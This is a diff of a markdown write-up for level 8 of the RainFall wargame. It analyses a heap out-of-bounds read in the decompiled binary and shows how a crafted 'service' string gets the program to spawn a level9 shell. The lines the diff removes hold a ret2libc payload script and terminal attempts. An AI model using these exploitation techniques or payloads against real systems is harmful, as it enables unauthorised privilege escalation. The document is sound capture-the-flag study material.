@@ -1,106 +1,52 @@
 <h1 align="center"> LEVEL 8 </h1>
 
 ## 🔍 Analysis of Decompiled [level8](./source.c)
+The program keeps two global pointers:
+- (gdb) info address :
+  - `auth` :  auth is at `0x8049aac` → initially NULL.
+  - `service` : info address service is at : `0x8049ab0` → initially NULL.
+  - p `0x8049ab0` - `0x8049aac` = 4
+
+It accepts four commands:
+
+- **auth \<str\>**
+  - Allocates 4 bytes for `auth` at `0x804a008`
+  - Uses `strcpy` into that buffer.
+- **reset**
+  - Frees `auth`
+- **service \<str\>**
+  - `service = strdup(buffer)`
+- **login**
+  - If `*(int*)(auth + 0x20) != 0` → calls `system("/bin/sh")`
+  - Else prints `"Password:"`
+
+⚠️ Vulnerability: auth only points to 4 bytes, but the program reads from auth+0x20. That lands outside its allocation and overlaps with the nextheap chunk.
+```
+(gdb) p/x auth
+$1 = 0x804a008
+(gdb) p/x service
+$2 = 0x804a018
+(gdb) p/x auth+0x20
+$3 = 0x804a028
+(gdb) p 0x804a028 - 0x804a018
+$3 = 16
 
 ```
-python - <<PY > /tmp/exploit
-from struct import pack
-OFF = 80            
-system = 0xb7e6b060
-ret_after_system = 0x41414141   # junk or address of exit()
-binsh = 0xb7f8cc58
 
-payload = b"A"*OFF
-payload += pack("<I", system)
-payload += pack("<I", ret_after_system)
-payload += pack("<I", binsh)
-payload += b"\n"
-open("/tmp/exploit","wb").write(payload)
-print("wrote /tmp/exploit, len=", len(payload))
-PY
+## 💥 Exploit
 
-
-#!/usr/bin/env python3
-payload = b"auth AAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX\n"
-payload += b"login\n"
-open("/tmp/exploit", "wb").write(payload)
-print("wrote /tmp/exploit, len=", len(payload))
-
-level8@RainFall:~$ ./level8 < /tmp/exploit
-(nil), (nil)
-0x804a008, (nil)
-0x804a008, 0x804a018
-Password:
-0x804a008, 0x804a018
-level8@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
-0
-level8@RainFall:~$ (echo "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX"; echo "login") | ./level8
-(nil), (nil)
-0x804a008, (nil)
-Password:
-0x804a008, (nil)
-level8@RainFall:~$
-
+The program reading 4 bytes from auth+0x20 without bounds checking. With heap layout manipulation, that address overlaps service, producing a non-zero at `auth + 0x20` and giving us a shell.
+```bash
 level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-(nil), (nil)
-auth
-0x804a008, (nil)
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
 service0123456789abcdef
-0x804a008, 0x804a018
-login
-$ whoami
-level9
-$ ^C
-$ ^X^Z^Z^C
-$ exit
-0x804a008, 0x804a018
-exit
-0x804a008, 0x804a018
-^C
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-(nil), (nil)
-authx
-(nil), (nil)
-authrr
-(nil), (nil)
-authuuuu
-(nil), (nil)
-auth
-(nil), (nil)
-auth
-0x804a008, (nil)
-service0123456789
-0x804a008, 0x804a018
-login
-Password:
-0x804a008, 0x804a018
-kaka
-0x804a008, 0x804a018
-whoami
-0x804a008, 0x804a018
-^C
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-0x804a008, (nil)
-service
-0x804a008, 0x804a018
-login
-Password:
-0x804a008, 0x804a018
-^C
-level8@RainFall:~$ clear
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-0x804a008, (nil)
-service0123456789abcdef
-0x804a008, 0x804a018
+0x804a008, 0x804a018 
 login
 $ whoami
 level9
 ```
+
+
+
